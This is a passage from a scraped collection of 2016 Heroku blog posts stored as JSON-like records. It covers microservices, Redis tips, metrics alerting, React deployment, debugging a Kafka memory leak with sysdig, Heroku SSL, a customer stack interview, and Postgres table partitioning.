APIs. We use Go for some services due to its raw speed. For example, our API gateway is written in Go. It consumes all the host and service information, and does various things such as circuit breaking , fail over, and error management. We’re really excited about that and just deployed it in Heroku Private Spaces. The client-facing service that backs our UIs is written in Node.js and powers our Backbone and Marionette front-end apps. We use MongoDB for all our database needs. How do you handle service discovery? We needed a microservices “chassis” – something that could create a platform for us to rapidly deploy services without having to worry too much about the inner workings of those services. We found many piecemeal technologies that could address different parts of the solution we needed, but nothing that could glue them all together.  So we built our own framework that we call “Vine” (relating to “Grape”) that connects all the services together and helps us maintain shared code between each service. The shared code aspect is more about the developer experience than service functionality. The framework’s plug-in architecture lets us write new core functionality that is modular.  Anytime we need to add functionality to a group of services, we can write code once and share it everywhere. For example, this allows us to manage service configuration of our Fastly CDN really easily. How did you decide to create your own framework to manage your microservices? There was nothing in the Ruby world that worked for us. We’re not dealing with large amounts of data, but we’re dealing with a very broad and rich dataset with many different constituents touching that data. Also, our industry is greatly influenced by changing conditions in local markets and with global suppliers. We needed the ability to respond quickly with new features or updates. In a sense, we modeled our framework after our experience with Heroku. We didn’t want our engineers worrying about inter-service discovery and service communication. Instead, we wanted them to focus on building features and launching product. This was why we switched to Heroku a year and a half ago, and it’s the same reason we built our Vine framework. We’re really excited about Heroku’s upcoming DNS service discovery feature that’s coming out soon. It will help us stabilize a lot of aspects of our system and we plan to integrate it into our existing architecture. How do you handle inter-service communication? We use RabbitMQ for asynchronous message passing and HTTP with MessagePack or ZeroMQ for our synchronous communication. We’ve explored ideas around using Kafka , but we’ve invested a lot of time in RabbitMQ so we’ll continue using that for the time being. We’ve been able to deploy really fast serialization between services, which is something we could only do in Heroku Private Spaces.  Because it’s an isolated environment, we can talk to services directly rather than having to go to the internet. What has been your experience working with Heroku Private Spaces? We’ve worked really closely with Heroku Support and the Private Spaces team on getting our service discovery working smoothly. Heroku Private Spaces has given us all the benefits of the Heroku platform combined with the architectural flexibility we needed to simplify private dyno communication and service discovery. Because we don’t have to go over the internet, things are inherently secure and can be optimized without authentication later. Our next step is to get down and dirty with our data layer, connecting our Private Space to an Amazon VPN. This will allow us to connect our database to the same private network as our Private Space. Any advice to others looking to take a microservices approach? To me, the world of microservices is like the Wild West right now. There are so many opinions, directions, and projects out there, creating a lot of noise in this area. To figure out the right microservice approach for your project, you just have to dive in and go through it yourself. You have to experience the bad with the good in order to come up with a strong opinion about which way to go for your project or company. menswear microservices grape vine ruby rest service discovery go heroku private spaces rabbitmq", "date": "2016-07-21,"},
{"website": "Heroku", "title": "Real-World Redis Tips", "author": ["Timothée Peignier"], "link": "https://blog.heroku.com/real-world-redis-tips", "abstract": "Real-World Redis Tips Posted by Timothée Peignier July 28, 2016 Listen to this article Redis might sound like it’s just a key/value store, but its versatility makes it a valuable Swiss Army knife for your application. Caching, queueing, geolocation, and more: Redis does it all. We’ve built (and helped our customers build) a lot of apps around Redis over the years, so we wanted to share a few tips that will ensure you get the most out of Redis, whether you’re running it on your own box or using the Heroku Redis add-on. Use a Connection Pooler By using a connection pooler, you'll reduce the connection overhead and therefore speed up operations while reducing the number of connections you use. Most Redis libraries will provide you with a specific connection pooler implementation; you just have to make sure you use them. Measure, compare, and adapt the size of your Redis connection pool so that you get the best performance out of it. You'll probably maintain a connection per dyno, so make sure your that the total amount of connections for each pool doesn’t exceed your add-on plan’s maximum connections. Give a Name to Your Client Redis allows you to list connected clients using CLIENT LIST . This command will give you lots of useful information about them too: CLIENT LIST\nid=2 addr=127.0.0.1:49743 fd=5 name=web.1 age=11 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=client One very simple way to make that view even more useful is to set a name to all of your connections. In order to do that you can use CLIENT SETNAME . I would recommend setting them to your dyno name, using the DYNO environment variable, so that Redis receives a command like this: CLIENT SETNAME web.1 Now, you will be able to track and scan your connections at a quick glance. Set an Appropriate Key Eviction Policy Redis by default will never evict keys, which means that once your Redis memory limit is reached, it will start returning errors if you try to create or update keys. To save yourself from those errors, you should make sure you have an appropriate key eviction policy . Here’s a quick rundown of where you might use each one: Caching only use cases : using allkeys-lru will remove the least recently used keys first, whether they are set to expire or not. Mixed usage : volatile will remove the least recently used keys first, but only for keys with an expiry set. Non-caching usage : the default noeviction policy will make sure you don't lose keys or reach a Redis limit unknowingly (in which case it will return an error). At the end of the day, these are just guidelines. As always, review your application usage and review all the policies available to you before making a decision. Avoid using KEYS KEYS is a useful command during development or debugging, but it can result in decreased performance if used when you are in production. KEYS is an O(N) operation, which means that its performance is directly related to the number of keys that you’re looking for. If it’s absolutely necessary for you to go through a list of keys, consider using SCAN . Set an Appropriate Connection Timeout By default, Redis will never close idle connections, which means that if you don't close your Redis connections explicitly, you will lock yourself out of your instance. To ensure this doesn't happen, Heroku Redis sets a default connection timeout of 300 seconds. This timeout doesn’t apply to non-publish/subscribe clients, and other blocking operations . Ensuring that your clients close connections properly, and that your timeout value is appropriate for your application will mean you never run out of connections. Use MULTI MULTI is a very useful command. It allows for a set of operations to be executed with some atomic guarantees. You can think of it as a basic transaction-like semantic, here is an example of how to use it: MULTI\nHMSET atomic name \"Project Manhattan\" location \"Los Alamos\" created 1942\nZADD history 1942 \"atomic\"\nEXEC This provides us with some atomic guarantees, but not full ACID compliance. If your application require stronger guarantees, you should consider using Postgres , which provides you a wide set of isolation levels , plus the ability to rollback. What are your tips? Redis is powerful and versatile, and though we see a lot of useful patterns from our customers and in our own apps, we can’t possibly see them all. Share what you’ve learned on the #redistips hashtag, and spread the good word. redis", "date": "2016-07-28,"},
{"website": "Heroku", "title": "Threshold Alerting for Application Metrics Now Generally Available", "author": ["Michelle Peot"], "link": "https://blog.heroku.com/threshold-alerting-generally-available", "abstract": "Threshold Alerting for Application Metrics Now Generally Available Posted by Michelle Peot August 02, 2016 Listen to this article Today we're announcing two new features that will help you better manage and run apps on Heroku: Threshold Alerting and Hobby dyno metrics. Threshold Alerting provides the ability to set notification thresholds for key performance and health indicators of your app.  We’ve also extended basic Application Metrics to Hobby dynos to provide basic health monitoring and application guidance. Together these features allow you to stay focused on building functionality by letting the platform handle your app monitoring. Threshold Alerting There are many ways to measure the health of an application. The new alerting feature focuses on what is most important to the end users of your app: responsiveness and request failures. Responsiveness is measured by tracking the maximum response time for 95% of the requests, known as the 95th percentile (or p95) response time. When measuring response time to gauge how users are experiencing your app, it is important to focus on the overall distribution of responses and not just the average response time of requests. The 95th percentile measure has become a best practice in the industry and Heroku has always tracked this measure for your apps and displayed it on the Metrics view.  Now you can define alerts that are triggered if the p95 response time exceeds the threshold you specified. In addition to response time, the request error rate is an important indicator of application health. If the percentage of failed requests suddenly spikes, you can now be alerted that something might be wrong with your app. Alerting is available on apps running on Professional dynos (Standard-1X and up). Alert Configuration First, select a metric on which to alert such as response time.  Then, enter the alerting Threshold (minimum response time is 50ms).  Select the Sensitivity setting, i.e. the minimum time the threshold must be breached for an alert to be triggered. Options are High (1 minute), Medium (5 minutes), and Low (10 minutes).  The Alert Simulation displays the alerts as they would appear based on the past 24 hours of your app’s data using the current threshold settings so that you can find a settings sweet-spot that won’t overwhelm your inbox. Notifications Setup The default distribution for email notifications is all app owners and collaborators for non-org accounts and admins for those in a Heroku Enterprise org.  An additional email address, including email-based PagerDuty integration, is supported. After configuring your alerts, you can specify the type(s) of email alert you wish to receive and the notification frequency (every 5 minutes, 1 hour, or 1 day), if applicable.  Leaving both options unchecked results in dashboard alerts only.  Lastly, activate your alert. Dashboard Notifications On the Application Metrics tab, alerts appear in both the Events table and on the corresponding plot. Hobby Dyno Metrics Traditionally, Hobby dynos had no access to the Application Metrics UI.  Now basic metrics are available, providing data for the past 24 hours at 10-minute resolution. This includes errors, events, application guidance, response time, throughput, memory, and dyno load. Standard 1X dynos and above provide metrics data with up to 1-minute resolution for a two hour time period. Additionally, Hobby users will now be able to try out labs features that previously would have only been available to higher level dyno types.  For Free dyno users considering an upgrade, Hobby dyno metrics and Heroku Teams are two great reasons. Find Out More For more details on both features refer to the Application Metrics Dev Center article . If there’s an additional alerting metric or feature you would like to see, drop us a line at metrics-feedback@heroku.com .  We also send out a user survey 1-2 times a year that helps drive our operational experience product roadmap.  If would like to be notified send us your email, or watch the Metrics tab for a survey link. alerts threshold alerting notifications metrics hobby", "date": "2016-08-02,"},
{"website": "Heroku", "title": "Deploying React with Zero Configuration", "author": ["Mars Hall"], "link": "https://blog.heroku.com/deploying-react-with-zero-configuration", "abstract": "Deploying React with Zero Configuration Posted by Mars Hall August 16, 2016 Listen to this article So you want to build an app with React ? \"Getting started\" is easy… and then what? React is a library for building user interfaces, which comprise only one part of an app. Deciding on all the other parts — styles, routers, npm modules, ES6 code, bundling and more — and then figuring out how to use them is a drain on developers. This has become known as javascript fatigue . Despite this complexity, usage of React continues to grow. The community answers this challenge by sharing boilerplates . These boilerplates reveal the profusion of architectural choices developers must make. That official \"Getting Started\" seems so far away from the reality of an operational app. New, Zero-configuration Experience Inspired by the cohesive developer experience provided by Ember.js and Elm , the folks at Facebook wanted to provide an easy, opinionated way forward. They created a new way to develop React apps , create-react-app . In the three weeks since initial public release, it has received tremendous community awareness (over 8,000 GitHub stargazers) and support (dozens of pull requests). create-react-app is different than many past attempts with boilerplates and starter kits. It targets zero configuration [ convention-over-configuration ], focusing the developer on what is interesting and different about their application. A powerful side-effect of zero configuration is that the tools can now evolve in the background. Zero configuration lays the foundation for the tools ecosystem to create automation and delight developers far beyond React itself. Zero-configuration Deploy to Heroku Thanks to the zero-config foundation of create-react-app , the idea of zero-config deployment seemed within reach. Since these new apps all share a common, implicit architecture, the build process can be automated and then served with intelligent defaults. So, we created this community buildpack to experiment with no-configuration deployment to Heroku . Create and Deploy a React App in Two Minutes You can get started building React apps for free on Heroku. npm install -g create-react-app\ncreate-react-app my-app\ncd my-app\ngit init\nheroku create -b https://github.com/mars/create-react-app-buildpack.git\ngit add .\ngit commit -m \"react-create-app on Heroku\"\ngit push heroku master\nheroku open Try it yourself using the buildpack docs . Growing Up from Zero Config create-react-app is very new (currently version 0.2) and since its target is a crystal-clear developer experience, more advanced use cases are not supported (or may never be supported). For example, it does not provide server-side rendering or customized bundles. To support greater control, create-react-app includes the command npm run eject . Eject unpacks all the tooling (config files and package.json dependencies) into the app's directory, so you can customize to your heart's content. Once ejected, changes you make may necessitate switching to a custom deployment with Node.js and/or static buildpacks. Always perform such project changes through a branch / pull request, so they can be easily undone. Heroku's Review Apps are perfect for testing changes to the deployment. We'll be tracking progress on create-react-app and adapting the buildpack to support more advanced use cases as they become available. Happy deploying!", "date": "2016-08-16,"},
{"website": "Heroku", "title": "Dawn of the Dead Ends: Fixing a Memory Leak in Apache Kafka", "author": ["Tom Crayford"], "link": "https://blog.heroku.com/fixing-kafka-memory-leak", "abstract": "Dawn of the Dead Ends: Fixing a Memory Leak in Apache Kafka Posted by Tom Crayford August 23, 2016 Listen to this article At Heroku, we're always working towards increased operational stability with the services we offer. As we recently launched the beta of Apache Kafka on Heroku , we've been running a number of clusters on behalf of our beta customers. Over the course of the beta, we have thoroughly exercised Kafka through a wide range of cases, which is an important part of bringing a fast-moving open-source project to market as a managed service. This breadth of exposure led us to the discovery of a memory leak in Kafka, having a bit of an adventure debugging it, and then contributing a patch to the Apache Kafka community to fix it. Issue Discovery For the most part, we’ve seen very few issues running Kafka in production. The system itself is very stable and performs very well even under massive amounts of load. However, we identified a scenario where processes in a long-running cluster would no longer fully recover from a restart. The process would seemingly restart successfully but always crash several seconds later. This is troubling to us; a significant part of safely managing and operating a distributed system like Kafka is the ability to restart individual members of a cluster. We started looking into this as a high priority problem. Fortunately, an internal team had a staging cluster where we could reproduce the issue to investigate further without impacting a production app. We quickly figured out a remediation that we could apply in case we hit this issue on a production cluster before we addressed the bug, and then got to debugging the issue at hand. A Tale of Failure to Debug I'm going to discuss the process of debugging this failure, including all the dead ends we encountered. Many debugging stories jump straight to \"we found this really difficult bug\", but leave out all the gory details and dead ends chased. This is a false picture of fixing gnarly bugs -- in reality nearly all of them involve days of going down dead ends and misunderstanding. Given that we were able to reproduce the issue consistently, we began our investigation by simply starting the process and looking at the resources on the server using top and similar diagnosis tools. It was immediately clear this was a memory issue. The process would boot, allocate memory at a rate of around 400MB/s without freeing any, and then crash after exhausting all the memory on the server. We confirmed this by looking at stdout logs of the process. They contained this wonderful snippet: # There is insufficient memory for the Java Runtime Environment to continue.\n# Native memory allocation (mmap) failed to map 131072 bytes for committing reserved memory.\n# Possible reasons:\n#   The system is out of physical RAM or swap space\n#   In 32 bit mode, the process size limit was hit\n... We now had two indications that there was a memory issue of some kind! This is progress - we can now start looking at memory allocation, and mostly ignore all other issues. Typically, JVM memory is allocated on the heap, and Java has a bunch of tooling to understand what's on the heap. We broke open the logs emitted by the JVM's garbage collector and found a mystery inside. The GC logs were almost empty, indicating the program wasn't under heap pressure at all. Furthermore, what little information we did have indicated that this broker only ever had 100 megabytes of on-heap memory used. This didn't make sense given our previous evidence from top and stdout. JVM Memory: A Recap The JVM mostly allocates memory in two ways: On-heap Off-heap On-heap memory represents the majority of memory allocation in most JVM programs, and the garbage collector manages allocation and deallocation of on-heap memory. Some programs do use notable amounts of \"off-heap\" or native memory, whereby the application controls memory allocation and deallocation directly. Kafka shouldn't typically be using a lot of off-heap memory, but our next theory is that it must be doing exactly that. Clearly, this is the only alternative, right? It can't be on-heap memory, or we'd see more information in the GC logs. To test this theory, we wrote a small script to query the JMX metric java.lang:type=Memory , which tells you about how much on- and off-heap memory the JVM thinks it is using. We ran this script in a tight loop while starting the broker, and saw, to our frustration, nothing useful: ...\nheap_memory=100 MB offheap_memory=63.2 MB\nheap_memory=101 MB offheap_memory=63.2 MB\nheap_memory=103 MB offheap_memory=63.2 MB\n...\ncrash Neither on-heap nor off-heap memory was being used! But what else can even allocate memory? At this point, we reached further into our debugging toolkit. Tracing: A Magical Debugging Tool Tracing is a very effective debugging tool, often employed in this kind of situation. Are the logs not telling you what you need to know? Time to dump out relevant events from a tracing tool and start looking through them for ideas. In this particular case, we used sysdig , an especially powerful tool for debugging issues on a single server.  Sysdig allows you to capture system calls, much like the more venerable strace . A syscall is the mechanism by which a userland process communicates with the kernel. Seeing as most kinds of resource usage involve talking to the kernel, looking at syscalls is a very effective way to diagnose this kind of issue. Sysdig is best used in a \"capture, then analyze\" mode, much like tcpdump . This lets you write all the syscalls emitted by a process to a file, and then take your time analyzing them. The command: sudo sysdig 'proc.name=java' -w ~/sysdig.scap will capture to a file all syscalls emitted by the process named java . We ran this command, then booted our broker and watched it crash. Now we have a file full of syscalls, what do we look at? The capture file, in this case, was 434MB, which you can't \"just read through\". Sysdig gives you a suite of analysis tools for looking at the events emitted by the process. In this case, we're interested in memory allocation, so we're interested in the syscalls mmap and munmap for the most part. The issue we're debugging is that somewhere, Kafka is allocating memory and never freeing it. Remember, this isn't on-heap memory or off-heap memory, so something is doing native memory allocation. Firing up sysdig, we see that this program does indeed allocate a lot of memory using mmap syscalls. Analysis using bash scripting reveals that 9GB of memory is being allocated using mmap during this run. This is more memory than was available on the server, which seems to point in the right direction. When memory is allocated by mmap , the caller has to call 'munmap' eventually to release it back to the operating system. Not releasing memory back to the operating system is the definition of a memory leak and will cause the process to crash after the leak has used all available memory. A quick but complex sysdig query reveals this to be the case: $ sudo sysdig -r ~/sysdig.scap 'evt.type=mmap' -p '%proc.vmsize %evt.dir %evt.type %evt.info' | grep 'length=' | wc -l\n2551\n$ sudo sysdig -r ~/sysdig.scap 'evt.type=munmap' -p '%proc.vmsize %evt.dir %evt.type %evt.info' | grep 'length=' | wc -l\n518 A lot is going on in this query -- sysdig is an incredibly powerful tool. This specific query allows us to see the memory usage of the process at the moment in time when the syscall was traced (that's what %proc.vmsize does in the format argument). While here, we are just counting events, we also examined them for patterns, and this memory usage output was invaluable there. At this point, we were stumped. We are allocating a lot of memory, but not freeing it. The mmap calls didn't have any particular pattern that we could determine. At this stage in debugging, it's often time to take a break, and let your unconscious mind think up some possibilities. Recognize that you are human: getting rest helps with debugging just as much as staring at a screen. Why Is All the RAM Gone? A short while later, we had a hunch to follow: it's something to do with the cluster being configured to use GZIP to compress data. To provide context, Kafka can use compression to dramatically reduce data volumes transferred, both over the network and to disk. This particular cluster had GZIP compression enabled. Java exposes GZIP compression in the JVM classes GZIPInputStream and GZIPOutputStream . Those classes are backed entirely by a C library, zlib , which does its own memory allocation. A quick Google search for \"JVM GZIP Memory Leak\", and we came across this article , which describes almost exactly what we were seeing. That article describes a usage pattern with GZIP that causes the JVM to run out of memory very easily.  You open a GZIPInputStream or GZIPOutputStream and never close it when finished with it. This explains why the JVM didn't show this memory as either on-heap or off-heap -- it can't know what memory this C library uses. We broke open the Kafka source code, and found a point where it was opening a GZIPInputStream to decompress some data, but never closing it. Upon a restart, Kafka has to recover recently written messages, which involves decompressing them and checking them for validity. Most code in Kafka that does decompression reads the whole stream of compressed messages then closes the decompressor. This validity check works differently. It opens the compressed messages, reads the first message and checks its offset. It then short-circuits, failing to ever close the native buffers! This leads to our memory leak upon restart. As it so happens, this code path is never hit during normal operation. It only happens on restarts, which fits our evidence as well. We confirmed this memory issue by reproducing the bug in a development version of Kafka and then failing to reproduce after applying a patch that closes the GZIPInputStream when short-circuiting. This is often how debugging difficult bugs goes: hours and days of no progress staring at code and application logs and trace logs, and then some hunch points you in the right direction and is trivial to confirm. Trying different tools and different ways of looking at the problem help you get to a hunch. Giving Back Having found and diagnosed the issue, we sent in an upstream ticket to the Kafka project and started working on a patch. After some back and forth review from the Kafka committers, we had a patch in trunk , which is included in the brand new release of Kafka 0.10.0.1. It's interesting to note how small the resulting patch was - this was a major bug that meant Kafka couldn't boot in certain situations, but the bug and resulting bug fix were both very simple. Often a tiny change in code is responsible for a huge change in behavior. Kafka 0.10.0.1 is now the default version on Apache Kafka on Heroku. For those of you in the Apache Kafka on Heroku beta , you can provision a new cluster that doesn't have this issue. Likewise, we have tooling in place to upgrade existing versions. For our beta customers, the command heroku kafka:upgrade heroku-kafka --version 0.10 where heroku-kafka is the name of your Heroku Kafka cluster, will perform an in-place upgrade to the latest version of 0.10 (which is 0.10.0.1 at the time of writing). If you aren’t in the beta, you can request access here: https://www.heroku.com/kafka . kafka jvm memory leak gzip apache debug patch", "date": "2016-08-23,"},
{"website": "Heroku", "title": "SSL Is Now Included on All Paid Dynos ", "author": ["Brett Goulder"], "link": "https://blog.heroku.com/ssl-is-now-included-on-all-paid-dynos", "abstract": "SSL Is Now Included on All Paid Dynos Posted by Brett Goulder September 22, 2016 Listen to this article Encrypted communication is now the norm for applications on the Internet. At Heroku, part of our mission is to spread encryption by making it easy for developers to setup and use SSL on every application. Today we take a big step forward in that mission by making Heroku SSL generally available, allowing you to easily add SSL encryption to your applications with nothing more than a valid SSL certificate and custom domain. Heroku SSL is free for custom domains on Hobby dynos and above and relies on the SNI (“Server Name Indication”) extension which is now supported by the vast majority of browsers and client libraries.  The current SSL endpoint will remain available for the increasingly rare instances where your applications need to support legacy clients and browsers that do not support SNI. We had an overwhelmingly positive response to our Beta launch , and are looking forward to having more and more users and teams use the new SSL service. Encryption as the Default, Made Easy The first step for using Heroku SSL is getting an SSL certificate . Upload the certificate either via the dashboard on your application’s settings page or from the CLI. With this release we’ve made it even easier to complete the SSL certificate setup process in Dashboard : To upload via the CLI, use the Heroku certs command as following: $ heroku certs:add example.pem example.key When done with the certificate, the last step before starting to use Heroku SSL is updating your DNS to its new DNS target . Have a look at the documentation in Dev Center for full details. Note that our previous add-on, SSL Endpoint , will continue to exist. However, we highly recommend that you switch to Heroku SSL as we will be rolling out exciting new features to it over the coming months. In case you currently have an SSL Endpoint and would like to switch, we have some guidelines here on how to migrate from SSL Endpoint to Heroku SSL . Feedback We hope these changes make security on Heroku more solid and easier to access and set up for all users . Your feedback is welcome and highly appreciated. Please write to us by selecting product feedback here: Product Feedback . ssl free", "date": "2016-09-22,"},
{"website": "Heroku", "title": "Running the Bonobos Stack on Heroku: Interview with Austen Ito", "author": ["Chris Castle"], "link": "https://blog.heroku.com/bonobos-on-heroku", "abstract": "Running the Bonobos Stack on Heroku: Interview with Austen Ito Posted by Chris Castle September 08, 2016 Listen to this article Austen Ito is a software engineer at leading online fashion brand Bonobos, based in New York. Read our Bonobos customer story for more information about how Heroku has helped their business. What do you have running on Heroku? We’re running just about everything on Heroku, including our Bonobos.com website, cross-app messaging services, an API for our ERP, as well as some internal tools. The only pieces that are not on Heroku are the Data Science and ERP components. We’re also using Desk.com for customer service queuing. Walk us through your stack We use a mix of Backbone and React in terms of JavaScript frameworks on the front end. Some of our legacy work is in Backbone and our newer work is in React, so we’re slowly moving the old work to React. We’re using a Flux-like framework called Redux. On the backend, we use Rails and Solidus , a fork of Spree, the open source e-commerce engine built on top of Rails. The Solidus project was a great bootstrap for our API, admin, and data model, as well as our store customization. Are you taking a microservices approach? Yes, but not quite. We have services that are somewhat micro, but not everything is a microservice. I’ve seen that done to the extreme, and that approach is not necessarily one that we’d want to take here with the size of our team. What database are you using? We’re using Heroku Postgres Premium. We find the automatic promotion of the follower is great for us. We use read-only replicas for reporting and store them in our Redshift data warehouse. There are also internal users who need read-only access, such as our analytics and data science teams. What Heroku Add-ons are you using? We use a few, including Heroku Postgres , Redis Cloud , Librato , Logentries , Heroku Scheduler , SSL , and Rollbar . Rollbar is a really nice product for error handling, both front- and back-end. It groups errors really well together so you can do analysis and chase errors throughout the system. It has nice alerting rules around reactivation errors or error count notification. We also use Skylight , which is a Rails instrumentation engine for app performance monitoring. Their agent is lightweight and you get a good sense of the long tail of your performance, rather than just the median or worst case. What technology do you use for your Guideshops (brick-and-mortar versions of Bonobos)? Our Guideshop model is different than the traditional retail store in that it focuses on providing customer service and removing the nuances associated with it. That in-store experience is enhanced with technology we’re using here at Bonobos.com. We work with a company called Tulip . They built the iOS tablet application for our sales associates and it draws everything through our API. Employees are able to put in orders, do returns, as well as help people with their wish list and size preferences. All products, orders, everything is still administrable, still lives in our admin backend, but we don’t have to maintain that interface. Thank you for your time! Thank you! bonobos interview rails react postgres", "date": "2016-09-08,"},
{"website": "Heroku", "title": "Handling Very Large Tables in Postgres Using Partitioning", "author": ["Rimas Silkaitis"], "link": "https://blog.heroku.com/handling-very-large-tables-in-postgres-using-partitioning", "abstract": "Handling Very Large Tables in Postgres Using Partitioning Posted by Rimas Silkaitis September 13, 2016 Listen to this article One of the interesting patterns that we’ve seen, as a result of managing one of the largest fleets of Postgres databases , is one or two tables growing at a rate that’s much larger and faster than the rest of the tables in the database. In terms of absolute numbers, a table that grows sufficiently large is on the order of hundreds of gigabytes to terabytes in size. Typically, the data in this table tracks events in an application or is analogous to an application log. Having a table of this size isn’t a problem in and of itself, but can lead to other issues; query performance can start to degrade and indexes can take much longer to update. Maintenance tasks, such as vacuum, can also become inordinately long. Depending on how you need to work with the information being stored, Postgres table partitioning can be a great way to restore query performance and deal with large volumes of data over time without having to resort to changing to a different data store. We use pg_partman ourselves in the Postgres database that backs the control plane that maintains the fleet of Heroku Postgres, Heroku Redis, and Heroku Kafka stores. In our control plane, we have a table that tracks all of the state transitions for any individual data store. Since we don’t need that information to stick around after a couple of weeks, we use table partitioning. This allows us to drop tables after the two week window and we can keep queries blazing fast. To understand how to get better performance with a large dataset in Postgres, we need to understand how Postgres does inheritance, how to set up table partitions manually, and then how to use the Postgres extension, pg_partman, to ease the partitioning setup and maintenance process. Let’s Talk About Inheritance First Postgres has basic support for table partitioning via table inheritance. Inheritance for tables in Postgres is much like inheritance in object-oriented programming. A table is said to inherit from another one when it maintains the same data definition and interface. Table inheritance for Postgres has been around for quite some time, which means the functionality has had time to mature.  Let’s walk through a contrived example to illustrate how inheritance works: CREATE TABLE products (\n    id BIGSERIAL,\n    price INTEGER\n    created_at TIMESTAMPTZ,\n    updated_at TIMESTAMPTZ\n);\n\nCREATE TABLE books (\n    isbn TEXT,\n    author TEXT,\n    title TEXT\n) INHERITS (products);\n\nCREATE TABLE albums (\n    artist TEXT,\n    length INTEGER,\n    number_of_songs INTEGER\n) INHERITS (products); In this example, both books and albums inherit from products. This means that if a record was inserted into the books table, it would have all the same characteristics of the products table plus that of the books table. If a query was issued against the products table, that query would reference information on the product table plus all of its descendants. For this example, the query would reference products, books and albums. That’s the default behavior in Postgres. But, you can also issue queries against any of the child tables individually. Setting up Partitioning Manually Now that we have a grasp on inheritance in Postgres, we’ll set up partitioning manually. The basic premise of partitioning is that a master table exists that all other children inherit from. We’ll use the phrase ‘child table’ and partition interchangeably throughout the rest of the setup process. Data should not live on the master table at all. Instead, when data gets inserted into the master table, it gets redirected to the appropriate child partition table. This redirection is usually defined by a trigger that lives in Postgres. On top of that, CHECK constraints are put on each of the child tables so that if data were to be inserted directly on the child table, the correct information will be inserted. That way data that doesn’t belong in the partition won’t end up in there. When doing table partitioning, you need to figure out what key will dictate how information is partitioned across the child tables. Let’s go through the process of partitioning a very large events table in our Postgres database. For an events table, time is the key that determines how to split out information. Let’s also assume that our events table gets 10 million INSERTs done in any given day and this is our original events table schema: CREATE TABLE events (\n    uuid text,\n    name text,\n    user_id bigint,\n    account_id bigint,\n    created_at timestamptz\n); Let’s make a few more assumptions to round out the example. The aggregate queries that run against the events table only have a time frame of a single day. This means our aggregations are split up by hour for any given day. Our usage of the data in the events table only spans a couple of days. After that time, we don’t query the data any more. On top of that, we have 10 million events generated a day. Given these extra assumptions, it makes sense to create daily partitions. The key that we’ll use to partition the data will be the time at which the event was created (e.g. created_at). CREATE TABLE events (\n    uuid text,\n    name text,\n    user_id bigint,\n    account_id bigint,\n    created_at timestamptz\n);\n\nCREATE TABLE events_20160801 ( \n    CHECK (created_at >= ‘2016-08-01 00:00:00’ AND created_at < ‘2016-08-02 00:00:00’)  \n) INHERITS (events);\n\nCREATE TABLE events_20160802 ( \n    CHECK (created_at >= ‘2016-08-02 00:00:00’ AND created_at < ‘2016-08-03 00:00:00’)   \n) INHERITS (events); Our master table has been defined as events and we have two tables out in the future that are ready to accept data, events_20160801 and events_20160802. We’ve also put CHECK constraints on them to make sure that only data for that day ends up on that partition. Now we need to create a trigger to make sure that any data entered on the master table gets directed to the correct partition: CREATE OR REPLACE FUNCTION event_insert_trigger()\nRETURNS TRIGGER AS $$\nBEGIN\n    IF ( NEW.created_at >= ‘2016-08-01 00:00:00'AND\n         NEW.created_at < ‘2016-08-02 00:00:00' ) THEN\n        INSERT INTO events_20160801 VALUES (NEW.*);\n    ELSIF ( NEW.created_at >= ‘2016-08-02 00:00:00'AND\n         NEW.created_at < ‘2016-08-03 00:00:00' ) THEN\n        INSERT INTO events_20160802 VALUES (NEW.*);\n    ELSE\n        RAISE EXCEPTION 'Date out of range.  Fix the event_insert_trigger() function!';\n    END IF;\n    RETURN NULL;\nEND;\n$$\nLANGUAGE plpgsql;\n\nCREATE TRIGGER insert_event_trigger\n    BEFORE INSERT ON event\n    FOR EACH ROW EXECUTE PROCEDURE event_insert_trigger(); Great! The partitions have been created, the trigger function defined, and the trigger has been added to the events table. At this point, my application can insert data on the events table and the data can be directed to the appropriate partition. Unfortunately, utilizing table partitioning is a very manual setup fraught with chances for failure. It requires us to go into the database every so often to update the partitions and the trigger, and we haven’t even talked about removing old data from the database yet. This is where pg_partman comes in. Implementing pg_partman pg_partman is a partition management extension for Postgres that makes the process of creating and managing table partitions easier for both time and serial-based table partition sets. Compared to partitioning a table manually, pg_partman makes it much easier to partition a table and reduce the code necessary to run partitioning outside of the database. Let’s run through an example of doing this from scratch: First, let’s load the extension and create our events table. If you already have a big table defined, the pg_partman documentation has guidance for how to convert that table into one that’s using table partitioning. $ heroku pg:psql -a sushi\nsushi::DATABASE=> CREATE EXTENSION pg_partman;\nsushi::DATABASE=> CREATE TABLE events (\n  id bigint,\n  name text,\n  properities jsonb,\n  created_at timestamptz\n); Let’s reuse our assumptions that we made about our event data we made earlier. We’ve got 10 million events that are created a day and our queries really need aggregation on a daily basis. Because of this we’re going to create daily partitions. sushi::DATABASE=> SELECT create_parent('public.events', 'created_at', 'time', 'daily'); This command is telling pg_partman that we’re going to use time-series based partitioning, created_at is going to be the column we use for partitioning, and we want to partition on a daily basis for our master events table. Amazingly, everything that was done to manually set up partitioning is completed in this one command. But we’re not finished, we need to make sure that on regular intervals maintenance is run on the partitions so that new tables get created and old ones get removed. sushi::DATABASE=> SELECT run_maintenance(); The run_maintenance() command will instruct pg_partman to look through all of the tables that were partitioned and identify if new partitions should be created and old partitions destroyed. Whether or not a partition should be destroyed is determined by the retention configuration options. While this command can be run via a terminal session, we need to set this up to run on a regular basis. This is a great opportunity to use Heroku Scheduler to accomplish the task. This command will run on an hourly basis to double check the partitions in the database. Checking the partitioning on an hourly basis might be a bit overkill in this scenario but since Heroku Scheduler is a best effort service, running it hourly is not going to cause any performance impacts on the database. That’s it! We’ve set up table partitioning in Heroku Postgres and it will be running on its own with very little maintenance on our part. This setup only scratches the surface of what’s possible with pg_partman. Check out the extension’s documentation for the details of what’s possible. Should I Use Table Partitioning? Table partitioning allows you to break out one very large table into many smaller tables dramatically increasing performance. As pointed out in the 'Setting up Partitioning Manually' section, many challenges exist when trying to create and use table partitioning on your own but pg_partman can ease that operational burden. Despite that, table partitioning shouldn’t be the first solution you reach for when you run into problems. A number of questions should be asked to determine if table partitioning is the right fit: Do you have a sufficiently large data set stored in one table, and do you expect it to grow significantly over time? Is the data immutable, that is, will it never updated after being initially inserted? Have you done as much optimization as possible on the big table with indexes? Do you have data that has little value after a period of time? Is there a small range of data that has to be queried to get the results needed? Can data that has little value be archived to a slower, cheaper storage medium, or can the older data be stored in aggregate or “rolled up”? If you answered yes to all of these questions, table partitioning could make sense for you. The big caveat is that table partitioning requires you to evaluate how you’re querying your data. This is a big departure from designing a schema and optimizing it as you go, table partitioning requires you to plan 